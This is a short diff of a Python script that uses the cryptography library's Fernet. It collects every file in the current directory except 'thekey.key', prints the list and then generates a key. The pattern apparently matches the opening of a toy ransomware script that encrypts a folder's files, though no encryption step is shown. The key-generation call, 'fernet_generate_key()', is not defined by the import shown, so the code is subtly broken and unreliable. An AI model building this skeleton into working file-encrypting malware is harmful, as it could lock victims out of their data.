@@ -6,8 +6,11 @@ from cryptography.fernet import Fernet
 files = [] 
 
 for file in os.listdir():
+    if file == "thekey.key":
+      continue 
     if os.path.isfile(file):
         files.append(file)
+
 print(files)
 
 key = fernet_generate_key()
